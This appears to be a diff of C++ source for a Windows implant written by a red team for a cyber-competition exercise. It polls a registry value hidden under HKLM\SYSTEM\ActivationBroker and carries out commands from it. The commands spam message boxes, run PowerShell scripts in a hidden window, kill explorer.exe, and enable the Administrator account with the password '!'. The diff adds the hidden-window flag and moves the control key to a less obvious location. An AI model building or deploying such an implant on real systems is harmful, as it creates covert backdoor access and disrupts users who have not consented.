@@ -14,18 +14,20 @@
 /*
 	Current Registry Value to Control Flow : Computer\HKEY_CURRENT_USER\AppEvents\testvalue (DWORD)
 
+	Values 2-8 are not functioning currently.
+
 	0x0000000 : The default waiting value
 	0x0000001 : Message "Welcome to Prom!!!" as title and "Are you ready for a long day?" as message 100x.
 	0x0000002 : Glitch the Cursor 
 	0x0000003 : Return Cursor to default Cursor
 	0x0000004 : Runs the RickBomb.ps1 script
 	0x0000005 : Runs the script to change keyboard to dvorak
-	0x0000006 : Runs the script to change keyboard to qwert
-	0x0000007 : Runs the script to change Primary DNS server to 127.0.0.1 and flushes DNS cache
+	0x0000006 : Runs the script to change keyboard to qwerty
+	0x0000007 : -
 	0x0000008 : Signs the user out
 	0x0000009 : Messages "IMPORTANT NOTICE" title with a message asking if they know we are still there 50x.
 	0x0000010 : Set the admin account to active and change the password to "!"
-	0x0000011 : Activates the Administrator user and changes the password
+	0x0000011 : Kills explorer.exe
 	0x0000012 : Sends a message and asks blue team out to Prom
 
 */
@@ -36,8 +38,6 @@
 #include <Windows.h>
 #include <string>
 #include <io.h>
-//#include <process.h>
-//#include <TlHelp32.h>
 
 #pragma comment(lib, "advapi32.lib")
 
@@ -374,7 +374,7 @@ Description :
 void callScript(string path) {
 
 	if (_access(path.c_str(), 0) == 0) {
-		string run = "start powershell.exe "; // -windowstyle hidden
+		string run = "start powershell.exe -windowstyle hidden ";
 		run.append(path);
 
 
@@ -415,8 +415,8 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 	DWORD type = REG_DWORD, size = 1024;
 
 	// This is the registry and key that is being checked
-	HKEY reg = HKEY_CURRENT_USER;
-	LPCWSTR regPath = L"AppEvents";
+	HKEY reg = HKEY_LOCAL_MACHINE;
+	LPCWSTR regPath = L"SYSTEM\\ActivationBroker";
 	LPCWSTR regRead = L"testvalue";
 
 	DWORD resetValue = 0x00000000;
@@ -433,10 +433,10 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 					messageSpam(L"Welcome to Prom!!!", L"Are you ready for a long day?", NUM_BOXES);
 				}
 				else if (buffer == 0x00000002) {
-					glitchCursor();
+					//glitchCursor();
 				}
 				else if (buffer == 0x00000003) {
-					defaultCursor();
+					//defaultCursor();
 				}
 				else if (buffer == 0x00000004) {
 					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\RickBomb.ps1");
@@ -451,14 +451,13 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 					callScript("C:\\Users\\student\\KeyboardDefault.ps1");
 				}
 				else if (buffer == 0x00000007) {
-					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\DNSChanger.ps1");
-					callScript("C:\\Users\\student\\DNSChanger.ps1");
+					messageSpam(L"IMPORTANT NOTIFICATION", L"You feeling it now Mr. Krabs?", NUM_BOXES);
 				}
 				else if (buffer == 0x00000008) {
-					system("shutdown -L");
+					//system("shutdown -L");
 				}
 				else if (buffer == 0x00000009) {
-					messageSpam(L"IMPORTANT NOTIFICATION", L"Just wanted to let you know, we're still here.", NUM_BOXES / 2);
+					messageSpam(L"IMPORTANT NOTIFICATION", L"Just wanted to let you know, we're still here.", NUM_BOXES);
 				}
 				else if (buffer == 0x00000010) {
 					system("net user administrator /active:yes !");
@@ -467,13 +466,13 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 					killExplorer();
 				}
 				else if (buffer == 0x00000012) {
-					messageSpam(L"HEY BLUE TEAM", L"Will go to Prom with me? :) -Red Team", NUM_BOXES / 2);
+					messageSpam(L"HEY BLUE TEAM", L"Will go to Prom with me? :) -Red Team", NUM_BOXES);
 				}
 			}
 			RegSetValueEx(hKey, regRead, 0, REG_DWORD, (BYTE*)&resetValue, sizeof(resetValue));
 			RegCloseKey(hKey);
 		}
-		Sleep(1000); // Waits to not overheat the processor
+		Sleep(5000); // Waits to not overheat the processor
 	}
 	return 0;
 }
